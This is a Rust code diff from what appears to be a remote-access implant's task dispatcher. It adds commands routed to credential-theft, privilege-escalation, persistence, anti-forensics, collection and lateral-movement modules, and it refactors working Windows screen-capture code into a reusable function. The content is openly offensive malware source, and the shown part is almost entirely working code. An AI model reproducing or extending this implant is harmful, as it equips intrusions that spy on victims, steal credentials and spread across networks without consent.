@@ -17,6 +17,13 @@ pub fn run(task: &Task) -> TaskOutput {
         "relay_start"  => exec_relay_start(task),
         "relay_stop"   => exec_relay_stop(task),
         "inject"       => exec_inject(task),
+        "cred"         => crate::cred::exec_cred(task),
+        "enum"         => crate::discovery::exec_enum(task),
+        "priv"         => crate::privesc::exec_priv(task),
+        "persist"      => crate::persist::exec_persist(task),
+        "antifor"      => crate::antifor::exec_antifor(task),
+        "collect"      => crate::collect::exec_collect(task),
+        "lateral"      => crate::lateral::exec_lateral(task),
         other          => TaskOutput::failure(&format!("unknown task type: {other}")),
     }
 }
@@ -647,7 +654,7 @@ fn exec_inject(task: &Task) -> TaskOutput {
 // ---------------------------------------------------------------------------
 
 #[cfg(target_os = "windows")]
-fn exec_screenshot(_task: &Task) -> TaskOutput {
+pub fn capture_screenshot() -> Vec<u8> {
     use windows_sys::Win32::Graphics::Gdi::{
         BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject,
         GetDC, GetDIBits, ReleaseDC, SelectObject,
@@ -656,115 +663,69 @@ fn exec_screenshot(_task: &Task) -> TaskOutput {
     use windows_sys::Win32::UI::WindowsAndMessaging::{
         GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN,
     };
-
     unsafe {
         let hdc_screen = GetDC(0);
-        if hdc_screen == 0 {
-            return TaskOutput::failure("screenshot: GetDC failed");
-        }
-
+        if hdc_screen == 0 { return Vec::new(); }
         let width  = GetSystemMetrics(SM_CXSCREEN);
         let height = GetSystemMetrics(SM_CYSCREEN);
-
-        if width <= 0 || height <= 0 {
-            ReleaseDC(0, hdc_screen);
-            return TaskOutput::failure("screenshot: invalid screen dimensions");
-        }
-
+        if width <= 0 || height <= 0 { ReleaseDC(0, hdc_screen); return Vec::new(); }
         let hdc_mem = CreateCompatibleDC(hdc_screen);
-        if hdc_mem == 0 {
-            ReleaseDC(0, hdc_screen);
-            return TaskOutput::failure("screenshot: CreateCompatibleDC failed");
-        }
-
+        if hdc_mem == 0 { ReleaseDC(0, hdc_screen); return Vec::new(); }
         let hbm = CreateCompatibleBitmap(hdc_screen, width, height);
-        if hbm == 0 {
-            DeleteDC(hdc_mem);
-            ReleaseDC(0, hdc_screen);
-            return TaskOutput::failure("screenshot: CreateCompatibleBitmap failed");
-        }
-
+        if hbm == 0 { DeleteDC(hdc_mem); ReleaseDC(0, hdc_screen); return Vec::new(); }
         let old = SelectObject(hdc_mem, hbm);
         let ok  = BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);
-
         if ok == 0 {
-            SelectObject(hdc_mem, old);
-            DeleteObject(hbm);
-            DeleteDC(hdc_mem);
-            ReleaseDC(0, hdc_screen);
-            return TaskOutput::failure("screenshot: BitBlt failed");
+            SelectObject(hdc_mem, old); DeleteObject(hbm); DeleteDC(hdc_mem); ReleaseDC(0, hdc_screen);
+            return Vec::new();
         }
-
-        // BMP rows must be padded to 4-byte boundaries
-        let row_stride  = ((width as usize * 3) + 3) & !3;
-        let pixel_size  = row_stride * height as usize;
-
+        let row_stride = ((width as usize * 3) + 3) & !3;
+        let pixel_size = row_stride * height as usize;
         let mut bmi = BITMAPINFO {
             bmiHeader: BITMAPINFOHEADER {
-                biSize:          std::mem::size_of::<BITMAPINFOHEADER>() as u32,
-                biWidth:         width,
-                biHeight:        height, // positive = bottom-up rows (standard BMP)
-                biPlanes:        1,
-                biBitCount:      24,
-                biCompression:   0, // BI_RGB
-                biSizeImage:     0,
-                biXPelsPerMeter: 0,
-                biYPelsPerMeter: 0,
-                biClrUsed:       0,
-                biClrImportant:  0,
+                biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
+                biWidth: width, biHeight: height, biPlanes: 1, biBitCount: 24,
+                biCompression: 0, biSizeImage: 0,
+                biXPelsPerMeter: 0, biYPelsPerMeter: 0, biClrUsed: 0, biClrImportant: 0,
             },
             bmiColors: [RGBQUAD { rgbBlue: 0, rgbGreen: 0, rgbRed: 0, rgbReserved: 0 }],
         };
-
         let mut pixels = vec![0u8; pixel_size];
-        let lines = GetDIBits(
-            hdc_mem, hbm, 0, height as u32,
-            pixels.as_mut_ptr() as *mut _,
-            &mut bmi as *mut _,
-            DIB_RGB_COLORS,
-        );
-
-        SelectObject(hdc_mem, old);
-        DeleteObject(hbm);
-        DeleteDC(hdc_mem);
-        ReleaseDC(0, hdc_screen);
-
-        if lines == 0 {
-            return TaskOutput::failure("screenshot: GetDIBits failed");
-        }
-
-        // Build a self-contained BMP file in memory
-        if pixel_size > (u32::MAX - 54) as usize {
-            return TaskOutput::failure("screenshot: image too large to encode");
-        }
+        let lines = GetDIBits(hdc_mem, hbm, 0, height as u32, pixels.as_mut_ptr() as *mut _, &mut bmi as *mut _, DIB_RGB_COLORS);
+        SelectObject(hdc_mem, old); DeleteObject(hbm); DeleteDC(hdc_mem); ReleaseDC(0, hdc_screen);
+        if lines == 0 || pixel_size > (u32::MAX - 54) as usize { return Vec::new(); }
         let file_size   = 14u32 + 40 + pixel_size as u32;
         let data_offset = 14u32 + 40;
-
         let mut bmp: Vec<u8> = Vec::with_capacity(file_size as usize);
-        // BITMAPFILEHEADER (14 bytes)
         bmp.extend_from_slice(b"BM");
         bmp.extend_from_slice(&file_size.to_le_bytes());
         bmp.extend_from_slice(&0u16.to_le_bytes());
         bmp.extend_from_slice(&0u16.to_le_bytes());
         bmp.extend_from_slice(&data_offset.to_le_bytes());
-        // BITMAPINFOHEADER (40 bytes)
         bmp.extend_from_slice(&40u32.to_le_bytes());
         bmp.extend_from_slice(&(width  as u32).to_le_bytes());
         bmp.extend_from_slice(&(height as u32).to_le_bytes());
         bmp.extend_from_slice(&1u16.to_le_bytes());
         bmp.extend_from_slice(&24u16.to_le_bytes());
-        bmp.extend_from_slice(&0u32.to_le_bytes());                // BI_RGB
+        bmp.extend_from_slice(&0u32.to_le_bytes());
         bmp.extend_from_slice(&(pixel_size as u32).to_le_bytes());
         bmp.extend_from_slice(&0u32.to_le_bytes());
         bmp.extend_from_slice(&0u32.to_le_bytes());
         bmp.extend_from_slice(&0u32.to_le_bytes());
         bmp.extend_from_slice(&0u32.to_le_bytes());
-        // Pixel data
         bmp.extend_from_slice(&pixels);
-
-        TaskOutput::success(bmp)
+        bmp
     }
 }
+
+#[cfg(target_os = "windows")]
+fn exec_screenshot(_task: &Task) -> TaskOutput {
+    let bmp = capture_screenshot();
+    if bmp.is_empty() { TaskOutput::failure("screenshot: capture failed") } else { TaskOutput::success(bmp) }
+}
+
+#[cfg(not(target_os = "windows"))]
+pub fn capture_screenshot() -> Vec<u8> { Vec::new() }
 
 #[cfg(not(target_os = "windows"))]
 fn exec_screenshot(_task: &Task) -> TaskOutput {
